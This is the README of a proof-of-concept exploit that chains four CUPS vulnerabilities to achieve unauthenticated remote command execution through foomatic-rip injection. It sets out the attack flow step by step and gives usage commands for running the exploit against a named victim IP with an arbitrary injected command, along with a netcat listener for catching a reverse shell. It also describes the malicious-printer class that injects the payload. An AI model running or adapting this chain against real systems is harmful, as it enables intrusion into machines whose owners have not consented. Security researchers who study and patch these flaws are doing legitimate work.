# CUPS RCE PoC (Remote Command Execution via exploit-chaining Foomatic-rip Injection)

## Used IppSec's explanation, MalwareCube's one and EvilSocket's one, alongside with the docus and CVEs.

## Overview

This PoC demonstrates the exploitation of multiple vulnerabilities found in the Common Unix Printing System (CUPS), with a specific focus on **CVE-2024-47176** and related vulnerabilities.

### Key Vulnerabilities Addressed:

- **CVE-2024-47176**: Unrestricted Packet Processing on UDP Port 631, allowing unauthenticated remote attackers to force CUPS to contact an attacker's IPP server.
- **CVE-2024-47076**: Improper validation of IPP attributes in `libcupsfilters`, which allows attacker-controlled data to be processed as valid.
- **CVE-2024-47175**: Injection of malicious data into PPD files via `libppd`, allowing for command execution during print jobs.
- **CVE-2024-47177**: Command injection via `foomatic-rip`, allowing attackers to execute arbitrary commands on the system.

## Attack Flow

1. **Unrestricted Packet Processing (CVE-2024-47176)**: 
   - The attacker sends a malicious UDP packet to port 631, triggering the cups-browsed service to contact an attacker's IPP server.
   
2. **IPP Response Manipulation (CVE-2024-47076)**: 
   - The attacker's IPP server sends back malformed attributes, which are not properly validated, allowing the attacker to control the IPP response.

3. **PPD Injection (CVE-2024-47175)**:
   - CUPS processes the malicious IPP response and writes the payload into a temporary PPD file, leading to command injection.

4. **Command Execution via foomatic-rip (CVE-2024-47177)**:
   - A print job triggers the execution of the malicious commands injected into the PPD file.

---

## Usage

### Pre-requisites

- Python 3.x
- Install the required dependencies: `ippserver` package

### Running the PoC

```bash
python3 poc.py <LOCAL_HOST> <TARGET_HOST> <COMMAND>

LOCAL_HOST: Your machine's IP (where the malicious printer will be hosted).
TARGET_HOST: Target machine's IP (the victim).
COMMAND: Command you want to inject (e.g., mkdir /tmp/pwned).

set a listener in case of a reverse shell.
nc -lvnp 4444

TAILOR send_print_request.py for your needs (if you only have access to a CLI, if not you can also use the browser directly).
python3 send_print.request.py
```
### Example:
`python3 poc.py 192.168.1.10 192.168.1.20 "mkdir /tmp/pwned"`
This will start an IPP server on your local machine, send a malicious UDP packet to the target machine, and attempt to execute the command on the target via Foomatic-rip.

### Code Breakdown:

- IPPServerManager: Manages the IPP server lifecycle, starting and stopping the server in a separate thread.

- PrinterPwned: A subclass of StatelessPrinter, designed to inject a malicious command into the FoomaticRIPCommandLine attribute.

- send_browsed_packet: Sends a UDP packet announcing the "malicious" printer to the target.

- run: Starts the IPP server and keeps it running until interrupted.






